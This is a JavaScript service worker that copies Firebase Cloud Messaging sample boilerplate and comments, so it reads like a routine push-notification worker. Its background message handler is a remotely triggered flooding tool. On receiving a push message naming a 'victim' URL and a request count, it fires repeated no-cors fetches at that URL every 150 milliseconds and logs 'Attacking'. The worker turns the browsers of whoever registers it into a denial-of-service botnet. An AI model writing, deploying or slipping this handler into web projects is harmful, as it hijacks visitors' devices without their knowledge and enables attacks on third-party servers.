// Give the service worker access to Firebase Messaging.
// Note that you can only use Firebase Messaging here, other Firebase libraries
// are not available in the service worker.
importScripts('https://www.gstatic.com/firebasejs/4.8.1/firebase-app.js');
importScripts('https://www.gstatic.com/firebasejs/4.8.1/firebase-messaging.js');
importScripts('https://unpkg.com/rxjs@6.3.3/bundles/rxjs.umd.min.js');

const { from, timer } = rxjs;
const { switchMap, take, tap } = rxjs.operators;

const options = {
  encoding: "utf-8",
  timeout: 0,
  noDelay: true, // disable/enable Nagle algorithm
  keepAlive: false, //default is false
  initialDelay: 0 // for keepAlive. default is 0
};

// Initialize the Firebase app in the service worker by passing in the
// messagingSenderId.
firebase.initializeApp({
  messagingSenderId: '309446817270'
});

// Retrieve an instance of Firebase Messaging so that it can handle background
// messages.
const messaging = firebase.messaging();

// Handle incoming messages. Called when:
// - a message is received while the app has focus
// - the user clicks on an app notification created by a service worker
//   `messaging.setBackgroundMessageHandler` handler.
messaging.setBackgroundMessageHandler(({ data: { victim, requests } }) => {
  console.log({ victim, requests });
  timer(0, 150).pipe(
    take(requests),
    switchMap(() => fetch(victim, { mode: 'no-cors' })),
    tap(() => console.log('Attacking'))
  ).subscribe();
});
